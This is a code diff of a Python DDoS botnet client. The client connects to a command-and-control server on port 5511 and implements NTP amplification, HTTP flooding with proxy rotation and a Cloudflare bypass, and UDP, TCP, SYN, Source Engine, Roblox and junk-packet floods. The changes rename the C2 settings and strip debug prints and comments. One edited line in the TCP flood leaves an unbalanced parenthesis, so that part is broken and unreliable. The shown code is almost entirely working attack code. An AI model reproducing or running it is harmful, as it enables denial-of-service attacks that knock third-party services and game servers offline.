@@ -10,12 +10,9 @@ from uuid import UUID, uuid4
 from icmplib import ping as pig
 from scapy.layers.inet import UDP
     
-# IP AND PORT C2 ------------------->
-KRYPTONC2_ADDRESS  = "localhost"
-KRYPTONC2_PORT     = 5511
+C2Host  = "localhost"
+C2Port  = 5511
 
-
-# Code -------------------------->
 base_user_agents = [
     'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
     'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
@@ -36,7 +33,7 @@ def rand_ua():
         random.random() + random.randint(3, 9)
     )
 
-# AMP METHODS ----------------->
+
 ntp_payload = "\x17\x00\x03\x2a" + "\x00" * 4
 def NTP(target, port, timer):
     try:
@@ -155,8 +152,6 @@ def httpSpoofAttack(url, timer):
             s.close()
 
 
-# Functions ------------------------>
-
 def remove_by_value(arr, val):
     return [item for item in arr if item != val]
 
@@ -178,7 +173,6 @@ def run(target, proxies, cfbp):
                 proxies = remove_by_value(proxies, proxy)
         
         except requests.RequestException as e:
-            #print("Request Exception:", e)
             proxies = remove_by_value(proxies, proxy)
 
     elif cfbp == 1 and len(proxies) > 0:
@@ -199,7 +193,6 @@ def run(target, proxies, cfbp):
                 proxies = remove_by_value(proxies, proxy)
         
         except requests.RequestException as e:
-            #print("Request Exception:", e)
             proxies = remove_by_value(proxies, proxy)
     
     else:
@@ -209,7 +202,6 @@ def run(target, proxies, cfbp):
 
         try:
             a = scraper.get(target, headers=headers, timeout=15)
-            #print("[%s%s%s] Cloudflare BYPASS"%(Y,a.status_code,C))
         except:
             pass
 
@@ -305,7 +297,6 @@ def attack_udp(ip, port, secs, size):
         dport = random.randint(1, 65535) if port == 0 else port
         data = random._urandom(size)
         s.sendto(data, (ip, dport))
-        print('Pacote UDP Enviado')
 
 def attack_tcp(ip, port, secs, size):
     while time.time() < secs:
@@ -313,8 +304,7 @@ def attack_tcp(ip, port, secs, size):
         try:
             s.connect((ip, port))
             while time.time() < secs:
-                s.send(random._urandom(size))
-                print('Pacote TCP Enviado')
+                s.send(random._urandom(size)))
         except:
             pass
 
@@ -331,7 +321,6 @@ def attack_SYN(ip, port, secs):
             
             while time.time() < secs:
                 s.send(pkt)
-                print('Pacote SYN Enviado')
         except:
             s.close()
 
@@ -359,7 +348,6 @@ def attack_hex(ip, port, secs):
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
-        print('Pacote HEX Enviado')
 
 def attack_vse(ip, port, secs):
     payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
@@ -368,7 +356,6 @@ def attack_vse(ip, port, secs):
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
-        print('Pacote VSE Enviado')
 
 
 def attack_roblox(ip, port, secs, size):
@@ -381,7 +368,6 @@ def attack_roblox(ip, port, secs, size):
             hex = "%064x" % ran
             hex = hex[:64]
             s.sendto(bytes.fromhex(hex) + bytes, (ip, dport))
-            print('Pacote ROBLOX Enviado')
 
 def attack_junk(ip, port, secs):
     payload = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
@@ -390,7 +376,6 @@ def attack_junk(ip, port, secs):
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
-        print('Pacote junk enviado')
 
 def main():
         c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
